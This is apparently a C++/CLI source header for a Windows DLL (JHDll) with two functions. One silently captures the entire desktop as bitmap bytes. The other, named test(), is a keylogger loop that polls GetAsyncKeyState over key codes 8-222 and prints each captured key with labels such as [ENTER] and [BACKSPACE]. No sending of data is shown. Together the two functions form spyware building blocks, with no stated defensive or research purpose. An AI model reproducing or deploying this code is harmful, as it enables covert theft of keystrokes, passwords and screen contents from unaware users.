#pragma once
#include "Windows.h"
#include <iostream>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

using namespace System;
using namespace System::Runtime::InteropServices;
using namespace System::IO;

namespace JHDll {

	public ref class Class1
	{
    public: 
        static array<byte>^ SaveBitmap(/*Stream^ fs*/)
        {
           // WCHAR* wPath = (WCHAR*)(void*)Marshal::StringToHGlobalUni(path);
            //===========================================

            BITMAPFILEHEADER bfHeader;
            BITMAPINFOHEADER biHeader;
            BITMAPINFO bInfo;
            HGDIOBJ hTempBitmap;
            HBITMAP hBitmap;
            BITMAP bAllDesktops;
            HDC hDC, hMemDC;
            LONG lWidth, lHeight;
            BYTE* bBits = NULL;
            HANDLE hHeap = GetProcessHeap();
            DWORD cbBits, dwWritten = 0;
            HANDLE hFile;
            INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
            INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

            ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
            ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
            ZeroMemory(&bInfo, sizeof(BITMAPINFO));
            ZeroMemory(&bAllDesktops, sizeof(BITMAP));

            hDC = GetDC(NULL);
            hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
            GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

            lWidth = bAllDesktops.bmWidth;
            lHeight = bAllDesktops.bmHeight;

            DeleteObject(hTempBitmap);

            bfHeader.bfType = (WORD)('B' | ('M' << 8));
            bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            biHeader.biSize = sizeof(BITMAPINFOHEADER);
            biHeader.biBitCount = 24;
            biHeader.biCompression = BI_RGB;
            biHeader.biPlanes = 1;
            biHeader.biWidth = lWidth;
            biHeader.biHeight = lHeight;

            bInfo.bmiHeader = biHeader;

            cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;

            hMemDC = CreateCompatibleDC(hDC);
            hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
            SelectObject(hMemDC, hBitmap);
            BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);


            array<byte>^ output = gcnew array<byte>(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + cbBits);
            size_t j = 0;

            for (size_t i = 0; i < sizeof(BITMAPFILEHEADER); i++)
                output[j++] = ((byte*)&bfHeader)[i];
            for (size_t i = 0; i < sizeof(BITMAPINFOHEADER); i++)
                output[j++] = ((byte*)&biHeader)[i];
            for (size_t i = 0; i < cbBits; i++)
                output[j++] = ((byte*)bBits)[i];

            //BinaryWriter^ bw = gcnew BinaryWriter(fs);
            //for (size_t i = 0; i < sizeof(BITMAPFILEHEADER); i++)
            //    bw->Write(((byte*)&bfHeader)[i]);
            //for (size_t i = 0; i < sizeof(BITMAPINFOHEADER); i++)
            //    bw->Write(((byte*)&biHeader)[i]);
            //for (size_t i = 0; i < cbBits; i++)
            //    bw->Write(((byte*)bBits)[i]);

            //hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            //WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
            //WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
            //WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
            //CloseHandle(hFile);

            DeleteDC(hMemDC);
            ReleaseDC(NULL, hDC);
            DeleteObject(hBitmap);

            //===========================================

            //Marshal::FreeHGlobal((IntPtr)wPath);

            //return TRUE;

            return output;
        }
		
        static void test()
        {
            short sScannedKey;
            Sleep((rand() % 10) + 10);
            for (sScannedKey = 8; sScannedKey <= 222; sScannedKey++)
            {
                if (GetAsyncKeyState(sScannedKey) == -32767)
                {
                    if ((sScannedKey >= 39) && (sScannedKey < 91))
                    {
                        std::cout << (char)sScannedKey;
                        break;
                    }

                    else
                    {
                        switch (sScannedKey)
                        {
                        case VK_SPACE:
                            std::cout << " ";
                            break;
                        case VK_SHIFT:
                            std::cout << ("[SHIFT]");
                            break;
                        case VK_RETURN:
                            std::cout << ("[ENTER]");
                            break;
                        case VK_BACK:
                            std::cout << ("[BACKSPACE]");
                            break;
                        case VK_TAB:
                            std::cout << ("[TAB]");
                            break;
                        case VK_CONTROL:
                            std::cout << ("[CTRL]");
                            break;
                        case VK_DELETE:
                            std::cout << ("[DEL]");
                            break;
                        case VK_OEM_1:
                            std::cout << ("[;:]");
                            break;
                        case VK_OEM_2:
                            std::cout << ("[/?]");
                            break;
                        case VK_OEM_3:
                            std::cout << ("[`~]");
                            break;
                        case VK_OEM_4:
                            std::cout << ("[ [{ ]");
                            break;
                        case VK_OEM_5:
                            std::cout << ("[\\|]");
                            break;
                        case VK_OEM_6:
                            std::cout << ("[ ]} ]");
                            break;
                        case VK_OEM_7:
                            std::cout << ("['\"]");
                            break;
                        case VK_OEM_PLUS:
                            std::cout << ("+");
                            break;
                        case VK_OEM_COMMA:
                            std::cout << (",");
                            break;
                        case VK_OEM_MINUS:
                            std::cout << ("-");
                            break;
                        case VK_OEM_PERIOD:
                            std::cout << (".");
                            break;
                        case VK_NUMPAD0:
                            std::cout << ("0");
                            break;
                        case VK_NUMPAD1:
                            std::cout << ("1");
                            break;
                        case VK_NUMPAD2:
                            std::cout << ("2");
                            break;
                        case VK_NUMPAD3:
                            std::cout << ("3");
                            break;
                        case VK_NUMPAD4:
                            std::cout << ("4");
                            break;
                        case VK_NUMPAD5:
                            std::cout << ("5");
                            break;
                        case VK_NUMPAD6:
                            std::cout << ("6");
                            break;
                        case VK_NUMPAD7:
                            std::cout << ("7");
                            break;
                        case VK_NUMPAD8:
                            std::cout << ("8");
                            break;
                        case VK_NUMPAD9:
                            std::cout << ("9");
                            break;
                        case VK_CAPITAL:
                            std::cout << ("[CAPS LOCK]");
                            break;
                        case VK_PRIOR:
                            std::cout << ("[PAGE UP]");
                            break;
                        case VK_NEXT:
                            std::cout << ("[PAGE DOWN]");
                            break;
                        case VK_END:
                            std::cout << ("[END]");
                            break;
                        case VK_HOME:
                            std::cout << ("[HOME]");
                            break;
                        case VK_LWIN:
                            std::cout << ("[WIN]");
                            break;
                        case VK_RWIN:
                            std::cout << ("[WIN]");
                            break;
                        case VK_VOLUME_MUTE:
                            std::cout << ("[SOUND-MUTE]");
                            break;
                        case VK_VOLUME_DOWN:
                            std::cout << ("[SOUND-DOWN]");
                            break;
                        case VK_VOLUME_UP:
                            std::cout << ("[SOUND-DOWN]");
                            break;
                        case VK_MEDIA_PLAY_PAUSE:
                            std::cout << ("[MEDIA-PLAY/PAUSE]");
                            break;
                        case VK_MEDIA_STOP:
                            std::cout << ("[MEDIA-STOP]");
                            break;
                        case VK_MENU:
                            std::cout << ("[ALT]");
                            break;
                        default:

                            break;
                        }
                    }
                }

            }
        }

	};
}
